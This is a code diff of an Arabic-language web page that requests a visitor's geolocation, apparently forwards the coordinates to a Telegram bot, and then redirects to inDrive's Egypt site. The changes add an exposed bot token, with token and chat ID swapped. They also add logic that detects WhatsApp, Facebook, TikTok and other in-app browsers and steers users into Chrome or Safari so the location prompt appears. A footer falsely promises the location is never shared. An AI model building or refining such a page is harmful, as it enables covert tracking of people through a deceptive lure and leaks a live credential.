@@ -258,6 +258,37 @@
     margin-bottom: 12px;
   }
 
+  /* ===================== دليل فتح الرابط (iOS) ===================== */
+  .ios-guide{ display: none; margin-top: 20px; text-align: right; }
+  .ios-guide.visible{ display: block; }
+  .ios-guide ol{ padding: 0; margin: 0; list-style: none; }
+  .ios-guide li{
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    padding: 12px 0;
+    border-bottom: 1px solid var(--border);
+    font-size: .92rem;
+    line-height: 1.65;
+    color: var(--text);
+  }
+  .ios-guide li:last-child{ border-bottom: none; }
+  .ios-guide .step-num{
+    min-width: 28px;
+    height: 28px;
+    border-radius: 50%;
+    background: var(--accent);
+    color: #14202B;
+    font-weight: 800;
+    font-size: .82rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    margin-top: 1px;
+  }
+  .ios-guide strong{ color: var(--accent-strong); }
+
   /* ===================== موبايلات صغيرة ===================== */
   @media (max-width: 380px){
     .card{ padding: 30px 18px 24px; }
@@ -317,6 +348,23 @@
     <button class="primary" id="mainBtn">تفعيل الموقع والمتابعة</button>
     <button class="ghost" id="retryBtn" hidden>إعادة المحاولة</button>
 
+    <div class="ios-guide" id="iosGuide">
+      <ol>
+        <li>
+          <span class="step-num">1</span>
+          <span>دوس على أيقونة <strong>···</strong> أو <strong>المشاركة ↑</strong> اللي في أسفل أو أعلى الشاشة</span>
+        </li>
+        <li>
+          <span class="step-num">2</span>
+          <span>اختار <strong>"Open in Safari"</strong> أو <strong>"افتح في Safari"</strong> أو <strong>"Open in Browser"</strong></span>
+        </li>
+        <li>
+          <span class="step-num">3</span>
+          <span>بعد ما Safari يفتح، الصفحة هتطلب منك إذن الموقع تلقائيًا</span>
+        </li>
+      </ol>
+    </div>
+
     <p class="foot-note" id="footNote">موقعك بيُستخدم فقط لتحسين الخدمة المقدّمة لك، ومش بيتم مشاركته مع أي جهة خارجية.</p>
   </main>
 
@@ -355,7 +403,7 @@ const CONFIG = {
 
   // الرابط اللي هيتحول له الزائر بعد الموافقة على مشاركة الموقع
   // هيتضاف لإحداثيات (lat, lng) تلقائي كـ query params في آخر الرابط
-  redirectUrl: "https://example.com",
+  redirectUrl: "https://indrive.com/en-eg",
 
   // أقصى وقت (بالمللي ثانية) بننتظره لإرسال الموقع (تيليجرام + السجل) قبل ما نحوّل الزائر
   maxWaitBeforeRedirectMs: 4000,
@@ -366,9 +414,9 @@ const CONFIG = {
 
   // --- إعدادات بوت تيليجرام ---
   // توكن البوت من BotFather. سيبه فاضي "" لو مش عايز إرسال تيليجرام
-  telegramBotToken: "8957494852:AAHEYi-iGdCgDSbgE3-ISJTZ_x5KEgZcbx0",
+  telegramBotToken: "8806116489",
   // الـ chat_id بتاعك أو بتاع الجروب/القناة اللي هيوصلها الإشعار
-  telegramChatId: "8806116489",
+  telegramChatId: "8957494852:AAHEYi-iGdCgDSbgE3-ISJTZ_x5KEgZcbx0",
 };
 
 /* ========================================================= */
@@ -399,8 +447,27 @@ const els = {
 };
 
 const ua = navigator.userAgent || "";
-const isIOS = /iphone|ipad|ipod/i.test(ua);
+const isIOS     = /iphone|ipad|ipod/i.test(ua);
 const isAndroid = /android/i.test(ua);
+
+// ======================================================
+// كشف متصفحات مدمجة (WebView / In-App Browser)
+// دي التطبيقات اللي بتفتح الروابط جوّاها وبتمنع
+// إذن الموقع من غير أي رسالة للمستخدم
+// ======================================================
+const isInApp = (
+  /FBAN|FBAV|FB_IAB|FBIOS/.test(ua)   ||  // Facebook
+  /Instagram/.test(ua)                 ||  // Instagram
+  /WhatsApp/.test(ua)                  ||  // WhatsApp
+  /Snapchat/.test(ua)                  ||  // Snapchat
+  /TikTok|musical_ly/.test(ua)        ||  // TikTok
+  /MicroMessenger/.test(ua)            ||  // WeChat
+  /Twitter/.test(ua)                   ||  // X / Twitter
+  /LinkedInApp/.test(ua)               ||  // LinkedIn
+  (isAndroid && /; wv\)/.test(ua))     ||  // Android WebView عام (تيليجرام / غيره)
+  // iOS in-app: AppleWebKit موجود لكن مفيش Safari/CriOS/FxiOS كـ identifier
+  (isIOS && /AppleWebKit/.test(ua) && !/Safari/.test(ua) && !/CriOS/.test(ua) && !/FxiOS/.test(ua))
+);
 
 /* ---------------- شاشة العميل: طلب الموقع ثم التحويل ---------------- */
 
@@ -410,43 +477,78 @@ function initGate(){
   els.message.textContent = CONFIG.preMessage;
   els.retryBtn.onclick = requestLocation;
 
+  // ── 1) الاتصال مش آمن ──────────────────────────────────
   if (!window.isSecureContext) {
     setState({
       title: "الصفحة لازم تفتح عن طريق رابط https",
-      message: "تحديد الموقع بيشتغل بس على اتصال آمن (https). تأكد إن الرابط اللي بتفتحه يبدأ بـ https://",
+      message: "تحديد الموقع بيشتغل بس على اتصال آمن. تأكد إن الرابط يبدأ بـ https://",
       showRetry: false, showMain: false,
     });
     return;
   }
 
+  // ── 2) المتصفح مش بيدعم Geolocation أصلًا ─────────────
   if (!("geolocation" in navigator)) {
     setState({
       title: "المتصفح مش بيدعم تحديد الموقع",
-      message: "جرّب تفتح الرابط من متصفح تاني أو من موبايلك.",
+      message: "جرّب تفتح الرابط من Chrome أو Safari مباشرة.",
       showRetry: false, showMain: false,
     });
     return;
   }
 
-  // لو الصفحة بتتفتح جوه معاينة/إطار مدمج (زي معاينة المحادثة)، المتصفحات
-  // بتمنع طلب إذن الموقع نهائيًا من غير ما تظهر أي رسالة. لازم الرابط
-  // يتفتح مباشرة كصفحة مستقلة عشان الإذن يظهر صح على أي فون.
-  if (window.self !== window.top) {
-    els.mainBtn.textContent = "فتح الرابط في نافذة جديدة";
-    els.mainBtn.onclick = () => window.open(window.location.href, "_blank");
-    setState({
-      title: "افتح الرابط مباشرة في المتصفح",
-      message: "الصفحة دلوقتي بتتعرض جوه معاينة مدمجة، وده بيمنع طلب إذن الموقع في أغلب الهواتف. دوس الزرار عشان تفتح الرابط في نافذة مستقلة ويشتغل عادي.",
-      showMain: true, showRetry: false,
-    });
+  // ── 3) In-App Browser أو iframe مدمج ──────────────────
+  // الأندرويد والآيفون بيمنعوا إذن الموقع في الحالة دي
+  // تمامًا من غير ما يطلعوا أي رسالة للمستخدم
+  const isTrapped = isInApp || window.self !== window.top;
+  if (isTrapped) {
+    if (isAndroid) {
+      // intent URL بيفتح نفس الرابط الحالي مباشرة في Chrome
+      const intentUrl =
+        `intent://${location.host}${location.pathname}${location.search}` +
+        `#Intent;scheme=https;package=com.android.chrome;end`;
+      els.mainBtn.textContent = "افتح في Chrome";
+      els.mainBtn.onclick = () => { location.href = intentUrl; };
+      setState({
+        title: "لازم تفتحه في Chrome",
+        message: "الرابط دلوقتي مفتوح جوه تطبيق والأندرويد بيمنع إذن الموقع في الحالة دي. دوس الزرار عشان يفتح في Chrome وهيطلب منك الإذن فورًا.",
+        showMain: true, showRetry: false,
+      });
+    } else if (isIOS) {
+      document.getElementById("iosGuide").classList.add("visible");
+      setState({
+        title: "لازم تفتحه في Safari",
+        message: "الرابط مفتوح جوه تطبيق، وده بيمنع طلب إذن الموقع. اتبع الخطوات دي:",
+        showMain: false, showRetry: false,
+      });
+    } else {
+      els.mainBtn.textContent = "فتح في نافذة مستقلة";
+      els.mainBtn.onclick = () => window.open(location.href, "_blank");
+      setState({
+        title: "افتح الرابط مباشرة في المتصفح",
+        message: "الصفحة مفتوحة في معاينة مدمجة، وده بيمنع طلب إذن الموقع.",
+        showMain: true, showRetry: false,
+      });
+    }
     return;
   }
 
-  els.mainBtn.textContent = "تفعيل الموقع والمتابعة";
+  // ── 4) متصفح حقيقي — نجهّز الزرار وننتظر تفاعل المستخدم ────────────
+  // Chrome (أندرويد وغيره) بيحجب أي طلب إذن تلقائي بيحصل من غير
+  // دوسة زرار حقيقية — لازم الطلب يكون جوه onClick مباشرة
+  els.mainBtn.textContent = "تحديد موقعي الآن";
   els.mainBtn.onclick = requestLocation;
+  els.mainBtn.hidden = false;
 
-  // نطلب الموقع تلقائيًا أول ما الصفحة تفتح، من غير ما ننتظر دوسة زرار
-  requestLocation();
+  // لو الإذن اترفض قبل كده، نوريه رسالة الإصلاح فورًا من غير ما ينتظر
+  if (navigator.permissions) {
+    navigator.permissions.query({ name: "geolocation" }).then(perm => {
+      if (perm.state === "denied") {
+        onLocationError({ code: 1 });
+      }
+      perm.onchange = () => { if (perm.state === "granted") requestLocation(); };
+    }).catch(() => {});
+  }
 }
 
 function setState({title, message, showMain = true, showRetry = false, locating = false, icon = null}){
